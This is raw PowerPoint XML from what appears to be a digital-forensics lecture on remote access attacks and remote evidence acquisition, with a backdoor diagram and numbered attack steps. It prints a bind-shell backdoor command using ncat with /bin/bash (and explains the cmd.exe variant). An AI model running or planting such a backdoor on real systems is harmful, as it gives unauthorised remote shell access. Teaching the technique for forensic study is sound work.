            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attack: Remote access a victim’s PC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Digital Forensic: Remote evidence acquisition </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30638369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Backdoor background</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="25" name="Group 24"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="691306" y="3101419"/>
            <a:ext cx="9244345" cy="2167923"/>
            <a:chOff x="1220568" y="4947656"/>
            <a:chExt cx="16789969" cy="4722849"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="26" name="pasted-image.tif"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId2"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="1220568" y="6319169"/>
              <a:ext cx="2050617" cy="2050617"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:miter lim="400000"/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="28" name="Shape 201"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4531579" y="5705086"/>
              <a:ext cx="2122268" cy="1112395"/>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2300"/>
              </a:lvl1pPr>
            </a:lstStyle>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="1800"/>
              </a:pPr>
              <a:r>
                <a:rPr sz="2133" dirty="0"/>
                <a:t>std input</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="29" name="Shape 202"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4550624" y="7663171"/>
              <a:ext cx="2164425" cy="1023276"/>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2300"/>
              </a:lvl1pPr>
            </a:lstStyle>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="1800"/>
              </a:pPr>
              <a:r>
                <a:rPr sz="1867" dirty="0"/>
                <a:t>std output</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="30" name="Shape 203"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="3381619" y="6442023"/>
              <a:ext cx="1083158" cy="438163"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="25400">
              <a:solidFill/>
              <a:miter lim="400000"/>
              <a:tailEnd type="triangle"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="2400"/>
              </a:pPr>
              <a:endParaRPr sz="4267"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="31" name="Shape 204"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3321689" y="7804900"/>
              <a:ext cx="1079942" cy="355834"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="25400">
              <a:solidFill/>
              <a:miter lim="400000"/>
              <a:tailEnd type="triangle"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="2400"/>
              </a:pPr>
              <a:endParaRPr sz="4267"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="32" name="Picture 31"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="6579816" y="6023612"/>
              <a:ext cx="5434477" cy="101603"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="33" name="Picture 32"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="6579818" y="6463892"/>
              <a:ext cx="5434478" cy="101604"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="34" name="Picture 33"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="6579818" y="7937137"/>
              <a:ext cx="5434478" cy="101604"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="35" name="Picture 34"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="6579818" y="8428218"/>
              <a:ext cx="5434478" cy="101604"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="36" name="Shape 213"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1" flipV="1">
              <a:off x="12026615" y="6185254"/>
              <a:ext cx="1092679" cy="380241"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="25400">
              <a:solidFill/>
              <a:miter lim="400000"/>
              <a:tailEnd type="triangle"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="2400"/>
              </a:pPr>
              <a:endParaRPr sz="4267"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="37" name="Shape 214"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="12117936" y="7804899"/>
              <a:ext cx="838107" cy="523630"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="25400">
              <a:solidFill/>
              <a:miter lim="400000"/>
              <a:tailEnd type="triangle"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="2400"/>
              </a:pPr>
              <a:endParaRPr sz="4267"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="38" name="Shape 215"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="8298014" y="6294553"/>
              <a:ext cx="2390972" cy="1"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="25400">
              <a:solidFill/>
              <a:miter lim="400000"/>
              <a:tailEnd type="triangle"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="2400"/>
              </a:pPr>
              <a:endParaRPr sz="4267"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="39" name="Shape 216"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8233576" y="8233479"/>
              <a:ext cx="2519848" cy="1"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="25400">
              <a:solidFill/>
              <a:miter lim="400000"/>
              <a:tailEnd type="triangle"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="2400"/>
              </a:pPr>
              <a:endParaRPr sz="4267"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="40" name="Shape 217"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8901674" y="4947656"/>
              <a:ext cx="1379383" cy="1529499"/>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1900" b="1">
                  <a:latin typeface="Helvetica"/>
                  <a:ea typeface="Helvetica"/>
                  <a:cs typeface="Helvetica"/>
                  <a:sym typeface="Helvetica"/>
                </a:defRPr>
              </a:lvl1pPr>
            </a:lstStyle>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="1800" b="0"/>
              </a:pPr>
              <a:r>
                <a:rPr sz="3377" dirty="0" err="1"/>
                <a:t>tcp</a:t>
              </a:r>
              <a:endParaRPr sz="3377" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="41" name="Shape 218"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="9012254" y="8141006"/>
              <a:ext cx="1379383" cy="1529499"/>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1900" b="1">
                  <a:latin typeface="Helvetica"/>
                  <a:ea typeface="Helvetica"/>
                  <a:cs typeface="Helvetica"/>
                  <a:sym typeface="Helvetica"/>
                </a:defRPr>
              </a:lvl1pPr>
            </a:lstStyle>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="1800" b="0"/>
              </a:pPr>
              <a:r>
                <a:rPr sz="3377"/>
                <a:t>tcp</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42" name="Shape 219"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="13351927" y="6095079"/>
              <a:ext cx="3841634" cy="1112395"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:miter lim="400000"/>
            </a:ln>
            <a:extLst>
              <a:ext uri="{C572A759-6A51-4108-AA02-DFA0A04FC94B}">
                <ma14:wrappingTextBoxFlag xmlns:ma14="http://schemas.microsoft.com/office/mac/drawingml/2011/main" xmlns="" val="1"/>
              </a:ext>
            </a:extLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="1800"/>
              </a:pPr>
              <a:r>
                <a:rPr sz="2133" dirty="0"/>
                <a:t>puts input</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="43" name="Shape 220"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="13246136" y="7266198"/>
              <a:ext cx="4764401" cy="1112395"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:miter lim="400000"/>
            </a:ln>
            <a:extLst>
              <a:ext uri="{C572A759-6A51-4108-AA02-DFA0A04FC94B}">
                <ma14:wrappingTextBoxFlag xmlns:ma14="http://schemas.microsoft.com/office/mac/drawingml/2011/main" xmlns="" val="1"/>
              </a:ext>
            </a:extLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0">
                <a:defRPr sz="1800"/>
              </a:pPr>
              <a:r>
                <a:rPr sz="2133" dirty="0"/>
                <a:t>receive</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="2133" dirty="0"/>
                <a:t> output</a:t>
              </a:r>
              <a:endParaRPr sz="2133" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="45" name="Picture 44"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9675751" y="3705465"/>
            <a:ext cx="1357165" cy="870848"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Shape 198"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774914" y="4722416"/>
            <a:ext cx="851932" cy="674832"/>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b="1">
                <a:solidFill>
                  <a:srgbClr val="00882B"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
                <a:ea typeface="Helvetica"/>
                <a:cs typeface="Helvetica"/>
                <a:sym typeface="Helvetica"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0">
              <a:defRPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Server </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:defRPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/ Victim</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Shape 197"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9800404" y="4675773"/>
            <a:ext cx="1097577" cy="674832"/>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b="1">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
                <a:ea typeface="Helvetica"/>
                <a:cs typeface="Helvetica"/>
                <a:sym typeface="Helvetica"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0">
              <a:defRPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:defRPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/ Attacker </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1026" name="Picture 2" descr="Image result for attack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14445" y="1514459"/>
            <a:ext cx="990052" cy="990052"/>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p:cNvCxnSpPr>
            <a:stCxn id="1026" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1561278" y="2009485"/>
            <a:ext cx="3353167" cy="1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74914" y="1985521"/>
            <a:ext cx="3100220" cy="1569660"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1. Let a victim </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>listen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> to a hidden communication channel (backdoor)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="TextBox 51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7793921" y="1809876"/>
            <a:ext cx="3132976" cy="1569660"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> a signal to activate the communication channel</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="53" name="Straight Arrow Connector 52"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5939975" y="2009485"/>
            <a:ext cx="4112859" cy="1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95B91847-4ACB-D04A-3B3A-37F13EEDEA78}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="10986207" y="2048722"/>
              <a:ext cx="360" cy="360"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="2" name="Ink 1">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95B91847-4ACB-D04A-3B3A-37F13EEDEA78}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId7"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10977567" y="2039722"/>
                <a:ext cx="18000" cy="18000"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
            </p:spPr>
          </p:pic>
        </mc:Fallback>
      </mc:AlternateContent>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1984385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6082" y="683666"/>
            <a:ext cx="4483725" cy="1105055"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="86082" y="1924968"/>
            <a:ext cx="4166329" cy="3046988"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Server listens port </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8080</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>: program to execute after connection occurs, connecting STDIN and STDOUT to the program</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cmd.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>: a shell command for Windows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6502808" y="0"/>
            <a:ext cx="5689192" cy="6394221"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Left-Right Arrow 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4701377" y="1236193"/>
            <a:ext cx="1684075" cy="21106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
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="324536" y="6017257"/>
            <a:ext cx="4675064" cy="376966"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="36363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20" rIns="0" bIns="95220" numCol="1" anchor="ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="1219170" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS" panose="020B0604020202020204" pitchFamily="34" charset="-128"/>
                <a:ea typeface="Monaco"/>
              </a:rPr>
              <a:t>ncat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS" panose="020B0604020202020204" pitchFamily="34" charset="-128"/>
                <a:ea typeface="Monaco"/>
              </a:rPr>
              <a:t> -l 10000 -e /bin/bash    //</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS" panose="020B0604020202020204" pitchFamily="34" charset="-128"/>
                <a:ea typeface="Monaco"/>
              </a:rPr>
              <a:t>if create a backdoor in Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="800"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="TextBox 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="324537" y="205173"/>
            <a:ext cx="2340641" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Start listener first</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="6" name="Straight Arrow Connector 5"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="2" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="2587511" y="436006"/>
            <a:ext cx="77667" cy="70425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3" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4252411" y="126386"/>
            <a:ext cx="2024732" cy="318100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
